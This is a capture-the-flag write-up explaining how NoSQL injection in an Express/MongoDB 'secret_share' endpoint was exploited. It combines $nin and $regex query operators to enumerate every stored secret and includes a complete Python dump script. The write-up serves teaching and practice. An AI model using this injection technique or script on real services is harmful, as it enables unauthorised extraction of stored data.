This was a (long) but educational challenge on NoSQL injections! The key was to understand how the Express nodeJS module parses the GET parameters into the object for the noSQL query, and read the documentation carefully to know which operators to use. Let's dig in.

First thing we can see in the source code is that part in the GET function for `/secret_share`:

```javascript
var secid = request.query.secid;
var sec = collection.findOne({id: secid});
```

where it builds the `secid` object out of the `secid` GET paramater, and does a `findOne` query to the MongoDB. With no input validation, this is injectable, and we can find the basics of NoSQL injection on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master) under 'NoSQL injection'  where you can learn about using `$regex`, `$ne`, `$gt`, `$nin`, and `$regex` to bypass authentication and dump information. That isn't quite what we need though as we can only act with operators on the `secid`, on not on the secret itself. So not being able to check for a `secret` starting with `CSR{`, we'll have to dump the whole database until we find that secret.

Our approach was to combine `$nin` and `$regex` to dump each part of the whole SHA256 space. Using `$gt` didn't work as mongoDB compares hashes as string values and not as hex integers, so starting from `02...` we would very fast get to `ff...` and not get any response anymore. Digging in the mongoDB documentation, we find that `$nin` and `$regex` are used as follows:

```
{ field: { $nin: [ value1, value2 ... valueN ]} }
{ field: { $regex: '/pattern/<options>' } }
```
The idea was to add found `secid`s to a `$nin` list until we get the flag. That by itself gets old pretty fast though as we can't add stuff to the URL indefinetely, so here comes the `$regex` to the rescue to allow us to dump only all the `secret`s whose `secid` start with `123` for example. But first we have to understand how we build that list for `$nin`. We had a first clue in the PayloadAllTheThings page with this example: `login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto`, but the best way to make sure how our GET parameters where parsed into an object was to create our own small Express NodeJS server and test it:

```javascript
var port = 8000;
var express = require('express');
var app = express();
app.get('/', function(request, response) {
    console.log({id: request.query.secid});
});

app.listen(port, () => {
    console.log(`Example app listening at http://localhost:${port}`)
})
```

That allowed us to test that this URL: 
```
http://localhost:8000/?secid[$nin]=hash&secid[$nin]=hash&secid[$regex]=^123
```
resulted in this object: 
```
{ id: { '$nin': [ 'hash', 'hash' ], '$regex': '^123' } }
```
which is exactly what we need for `$nin` and `$regex` from the mongoDB documentation. So we just keep adding hashes to the `$nin` list until we don't get a response anymore, and then we increase the `$regex` and move on to another part of the database.

Doing that continuously, we finally get the flag:
```
621565431f909b5b796d023e1e280fe0c4c60517476157e3da7c9ba2e09b6bfc CSR{We_Call_Him_Little_Bobby_NoTables}
```

The whole exploit code can be found below:

```python
import re
from requests import get
from hashlib import sha256
from itertools import product
from time import sleep

for p in product('0123456789abcdef',repeat=3):
    prefix = ''.join(p)
    secrets = []
    url = 'http://chal.cybersecurityrumble.de:37585/secret_share?'
    nin = 'secid[$nin]={}'
    ne = 'secid[$ne]={}'
    regex = 'secid[$regex]=^{}'.format(prefix)

    res = get(url+regex)
    result = re.search('-->(.*)<!--',res.text)
    if not result:
        print('got an error')
        continue
    secret = result.groups()[0]
    secid = sha256(secret.encode()).hexdigest()
    secrets.append((secid,secret))

    res = get(url+ne.format(secrets[0][0]))
    result = re.search('-->(.*)<!--',res.text)
    if not result:
        print('got an error')
        continue
    secret = result.groups()[0]
    secid = sha256(secret.encode()).hexdigest()
    secrets.append((secid,secret))
    i = 2
    while True:
        sleep(0.5)
        toget = '&'.join([nin.format(secrets[j][0]) for j in range(i)])
        toget += '&'+regex
        res = get(url+toget)

        result = re.search('-->(.*)<!--',res.text)
        if not result:
            print('got an error')
            break
        secret = result.groups()[0]
        secid = sha256(secret.encode()).hexdigest()
        print(secid,secret)
        if 'csr' in secret.lower():
            print('Got it')
            print(secret)
            exit()
        secrets.append((secid,secret))
        i += 1

```
